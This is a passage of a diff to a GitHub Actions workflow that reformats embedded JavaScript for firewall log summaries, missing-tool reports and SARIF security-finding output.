                       allowedDomains.add(entry.domain);
-
                     } else {
-
                       deniedRequests++;
-
                       deniedDomains.add(entry.domain);
-
                     }
-
                     if (!requestsByDomain.has(entry.domain)) {
-
                       requestsByDomain.set(entry.domain, { allowed: 0, denied: 0 });
-
                     }
-
                     const domainStats = requestsByDomain.get(entry.domain);
-
                     if (isAllowed) {
-
                       domainStats.allowed++;
-
                     } else {
-
                       domainStats.denied++;
-
                     }
-
                   }
-
                 }
-
                 const summary = generateFirewallSummary({
-
                   totalRequests,
-
                   allowedRequests,
-
                   deniedRequests,
-
                   allowedDomains: Array.from(allowedDomains).sort(),
-
                   deniedDomains: Array.from(deniedDomains).sort(),
-
                   requestsByDomain,
-
                 });
-
                 core.summary.addRaw(summary).write();
-
                 core.info("Firewall log summary generated successfully");
-
               } catch (error) {
-
                 core.setFailed(error instanceof Error ? error : String(error));
-
               }
-
             }
-
             function parseFirewallLogLine(line) {
-
               const trimmed = line.trim();
-
               if (!trimmed || trimmed.startsWith("#")) {
-
                 return null;
-
               }
-
               const fields = trimmed.match(/(?:[^\s"]+|"[^"]*")+/g);
-
               if (!fields || fields.length < 10) {
-
                 return null;
-
               }
-
               const timestamp = fields[0];
-
               if (!/^\d+(\.\d+)?$/.test(timestamp)) {
-
                 return null;
-
               }
-
               return {
-
                 timestamp,
-
                 clientIpPort: fields[1],
-
                 domain: fields[2],
-
                 destIpPort: fields[3],
-
                 proto: fields[4],
-
                 method: fields[5],
-
                 status: fields[6],
-
                 decision: fields[7],
-
                 url: fields[8],
-
                 userAgent: fields[9]?.replace(/^"|"$/g, "") || "-",
-
               };
-
             }
-
             function isRequestAllowed(decision, status) {
-
               const statusCode = parseInt(status, 10);
-
               if (statusCode === 200 || statusCode === 206 || statusCode === 304) {
-
                 return true;
-
               }
-
               if (decision.includes("TCP_TUNNEL") || decision.includes("TCP_HIT") || decision.includes("TCP_MISS")) {
-
                 return true;
-
               }
-
               if (decision.includes("NONE_NONE") || decision.includes("TCP_DENIED") || statusCode === 403 || statusCode === 407) {
-
                 return false;
-
               }
-
               return false;
-
             }
-
             function generateFirewallSummary(analysis) {
-
               const { totalRequests, requestsByDomain } = analysis;
-
               const validDomains = Array.from(requestsByDomain.keys())
-
                 .filter(domain => domain !== "-")
-
                 .sort();
-
               const uniqueDomainCount = validDomains.length;
-
               let validAllowedRequests = 0;
-
               let validDeniedRequests = 0;
-
               for (const domain of validDomains) {
-
                 const stats = requestsByDomain.get(domain);
-
                 validAllowedRequests += stats.allowed;
-
                 validDeniedRequests += stats.denied;
-
               }
-
               let summary = "### 🔥 Firewall Activity\n\n";
-
               summary += "<details>\n";
-
               summary += `<summary>📊 ${totalRequests} request${totalRequests !== 1 ? "s" : ""} | `;
-
               summary += `${validAllowedRequests} allowed | `;
-
               summary += `${validDeniedRequests} blocked | `;
-
               summary += `${uniqueDomainCount} unique domain${uniqueDomainCount !== 1 ? "s" : ""}</summary>\n\n`;
-
               if (uniqueDomainCount > 0) {
-
                 summary += "| Domain | Allowed | Denied |\n";
-
                 summary += "|--------|---------|--------|\n";
-
                 for (const domain of validDomains) {
-
                   const stats = requestsByDomain.get(domain);
-
                   summary += `| ${domain} | ${stats.allowed} | ${stats.denied} |\n`;
-
                 }
-
               } else {
-
                 summary += "No firewall activity detected.\n";
-
               }
-
               summary += "\n</details>\n\n";
-
               return summary;
-
             }
-
-            const isDirectExecution =
-
-              typeof module === "undefined" || (typeof require !== "undefined" && typeof require.main !== "undefined" && require.main === module);
-
+            const isDirectExecution = typeof module === "undefined" || (typeof require !== "undefined" && typeof require.main !== "undefined" && require.main === module);
             if (isDirectExecution) {
-
               main();
-
             }
-
       - name: Upload Agent Stdio
         if: always()
         uses: actions/upload-artifact@330a01c490aca151604b8cf639adc76d48f6c5d4 # v5
@@ -6582,9 +5973,7 @@ jobs:
                     }
                     lastIndex = regex.lastIndex;
                     if (iterationCount === ITERATION_WARNING_THRESHOLD) {
-                      core.warning(
-                        `High iteration count (${iterationCount}) on line ${lineIndex + 1} with pattern: ${pattern.description || pattern.pattern}`
-                      );
+                      core.warning(`High iteration count (${iterationCount}) on line ${lineIndex + 1} with pattern: ${pattern.description || pattern.pattern}`);
                       core.warning(`Line content (truncated): ${truncateString(line, 200)}`);
                     }
                     if (iterationCount > MAX_ITERATIONS_PER_LINE) {
@@ -6891,9 +6280,7 @@ jobs:
               core.setOutput("total_count", missingTools.length.toString());
               if (missingTools.length > 0) {
                 core.info("Missing tools summary:");
-                core.summary
-                  .addHeading("Missing Tools Report", 3)
-                  .addRaw(`Found **${missingTools.length}** missing tool${missingTools.length > 1 ? "s" : ""} in this workflow execution.\n\n`);
+                core.summary.addHeading("Missing Tools Report", 3).addRaw(`Found **${missingTools.length}** missing tool${missingTools.length > 1 ? "s" : ""} in this workflow execution.\n\n`);
                 missingTools.forEach((tool, index) => {
                   core.info(`${index + 1}. Tool: ${tool.tool}`);
                   core.info(`   Reason: ${tool.reason}`);
@@ -7024,9 +6411,7 @@ jobs:
               const messages = getMessages();
               const templateContext = toSnakeCase(ctx);
               const defaultMessage = "⚠️ Security scanning failed for [{workflow_name}]({run_url}). Review the logs for details.";
-              return messages?.detectionFailure
-                ? renderTemplate(messages.detectionFailure, templateContext)
-                : renderTemplate(defaultMessage, templateContext);
+              return messages?.detectionFailure ? renderTemplate(messages.detectionFailure, templateContext) : renderTemplate(defaultMessage, templateContext);
             }
             function collectGeneratedAssets() {
               const assets = [];
@@ -7399,9 +6784,7 @@ jobs:
                       },
                     },
                     results: validFindings.map((finding, index) => ({
-                      ruleId: finding.ruleIdSuffix
-                        ? `${workflowFilename}-${finding.ruleIdSuffix}`
-                        : `${workflowFilename}-security-finding-${index + 1}`,
+                      ruleId: finding.ruleIdSuffix ? `${workflowFilename}-${finding.ruleIdSuffix}` : `${workflowFilename}-security-finding-${index + 1}`,
                       message: { text: finding.message },
                       level: finding.sarifLevel,
                       locations: [
